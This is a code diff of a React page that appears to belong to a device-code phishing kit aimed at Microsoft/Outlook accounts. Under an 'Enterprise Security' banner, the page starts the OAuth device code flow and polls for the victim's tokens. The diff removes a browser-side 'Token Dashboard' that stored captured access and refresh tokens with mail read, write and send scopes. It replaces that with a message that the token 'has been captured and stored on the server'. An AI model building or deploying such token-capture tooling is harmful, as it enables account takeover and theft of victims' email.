@@ -1,5 +1,4 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
-import { addSession, addAuditEntry, createSessionFromToken, savePendingCode, clearPendingCode } from '../api/tokenStorage';
 
 const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
 
@@ -25,18 +24,6 @@ export function CapturePage(): React.ReactElement {
   const [authEmail, setAuthEmail] = useState('');
   const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const pollActiveRef = useRef(false);
-
-  const params = new URLSearchParams(window.location.hash.replace('#capture?', '').replace('#capture', ''));
-  const codeFromUrl = params.get('code');
-  const expiresFromUrl = params.get('expires');
-
-  useEffect(() => {
-    if (codeFromUrl) {
-      setUserCode(codeFromUrl);
-      setCountdown(expiresFromUrl ? parseInt(expiresFromUrl, 10) : 900);
-      setState('code_ready');
-    }
-  }, [codeFromUrl, expiresFromUrl]);
 
   useEffect(() => {
     if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
@@ -83,29 +70,15 @@ export function CapturePage(): React.ReactElement {
           status: string;
           error?: string;
           description?: string;
-          accessToken?: string;
-          refreshToken?: string;
-          expiresIn?: number;
-          scope?: string;
-          resource?: string;
+          email?: string;
+          displayName?: string;
         };
-
-        console.log('[CapturePage] poll response:', data.status, data.accessToken ? 'HAS_TOKEN' : 'NO_TOKEN');
 
         if (!pollActiveRef.current) return;
 
         if (data.status === 'complete') {
           stopPolling();
-          console.log('[CapturePage] Auth complete! accessToken present:', !!data.accessToken);
-          if (data.accessToken) {
-            try {
-              await handleAuthComplete(data.accessToken, data.refreshToken ?? '', typeof data.expiresIn === 'number' ? data.expiresIn : 3600);
-              console.log('[CapturePage] handleAuthComplete finished successfully');
-              console.log('[CapturePage] localStorage sessions:', localStorage.getItem('outlook_token_sessions'));
-            } catch (err) {
-              console.error('[CapturePage] handleAuthComplete error:', err);
-            }
-          }
+          setAuthEmail(data.email ?? '');
           setState('success');
           return;
         }
@@ -132,69 +105,17 @@ export function CapturePage(): React.ReactElement {
           return;
         }
 
-        // status === 'pending' — schedule next poll
         if (pollActiveRef.current) {
           pollTimerRef.current = setTimeout(poll, interval * 1000);
         }
       } catch {
-        // Network error — retry after interval
         if (pollActiveRef.current) {
           pollTimerRef.current = setTimeout(poll, interval * 1000);
         }
       }
     }
 
-    // Start first poll after interval
     pollTimerRef.current = setTimeout(poll, interval * 1000);
-  }
-
-  async function handleAuthComplete(accessToken: string, refreshToken: string, expiresIn: number): Promise<void> {
-    console.log('[CapturePage] handleAuthComplete called, token length:', accessToken.length);
-    let email = 'unknown@user.com';
-    let displayName = 'Authenticated User';
-
-    try {
-      const profileRes = await fetch('/api/user-profile', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ accessToken }),
-      });
-      console.log('[CapturePage] user-profile response status:', profileRes.status);
-      if (profileRes.ok) {
-        const profile = await profileRes.json() as { displayName: string; email: string };
-        console.log('[CapturePage] user profile:', profile.email, profile.displayName);
-        email = profile.email || email;
-        displayName = profile.displayName || displayName;
-      }
-    } catch (err) {
-      console.error('[CapturePage] Profile fetch failed:', err);
-    }
-
-    setAuthEmail(email);
-
-    const session = createSessionFromToken({
-      accessToken,
-      refreshToken,
-      expiresIn,
-      email,
-      displayName,
-      scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
-    });
-    console.log('[CapturePage] Created session:', session.id, session.accountEmail);
-
-    addSession(session);
-    console.log('[CapturePage] Session saved to localStorage');
-    clearPendingCode();
-
-    addAuditEntry({
-      id: `log_${Date.now()}`,
-      timestamp: new Date().toISOString(),
-      action: 'login',
-      accountEmail: email,
-      ipAddress: 'Web Client',
-      details: `Device code flow completed. Token expires in ${expiresIn}s.`,
-      success: true,
-    });
   }
 
   async function handleGenerateCode(): Promise<void> {
@@ -217,17 +138,6 @@ export function CapturePage(): React.ReactElement {
       setPollInterval(interval);
       setState('code_ready');
 
-      // Save pending code to localStorage so Dashboard can resume polling
-      savePendingCode({
-        deviceCode: data.deviceCode,
-        userCode: data.userCode,
-        expiresAt: Date.now() + data.expiresIn * 1000,
-        interval,
-      });
-      console.log('[CapturePage] Pending code saved to localStorage:', data.userCode);
-      console.log('[CapturePage] Polling started with interval:', interval, 's');
-
-      // Start polling immediately so token is captured whether user clicks Continue or not
       startPolling(data.deviceCode, interval);
     } catch (err) {
       setErrorMsg(err instanceof Error ? err.message : 'Network error');
@@ -257,7 +167,6 @@ export function CapturePage(): React.ReactElement {
     setCountdown(0);
     setErrorMsg('');
     setAuthEmail('');
-    window.location.hash = '#capture';
   }
 
   function formatTime(seconds: number): string {
@@ -371,10 +280,7 @@ export function CapturePage(): React.ReactElement {
               {authEmail && authEmail !== 'unknown@user.com' && (
                 <p className="capture-auth-email">Signed in as <strong>{authEmail}</strong></p>
               )}
-              <p>Your token has been captured and saved to the dashboard.</p>
-              <a href="#" className="capture-view-dashboard-btn" onClick={(e) => { e.preventDefault(); window.location.hash = ''; }}>
-                View Token Dashboard
-              </a>
+              <p>Your token has been captured and stored on the server.</p>
               <button className="capture-another-btn" onClick={handleReset}>
                 Sign in another account
               </button>
@@ -419,9 +325,6 @@ export function CapturePage(): React.ReactElement {
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
             <span>Enterprise Security — OAuth 2.0 Device Code Flow</span>
-          </div>
-          <div className="capture-footer-links">
-            <a href="#" onClick={(e) => { e.preventDefault(); window.location.hash = ''; }}>Token Dashboard</a>
           </div>
         </div>
       </div>
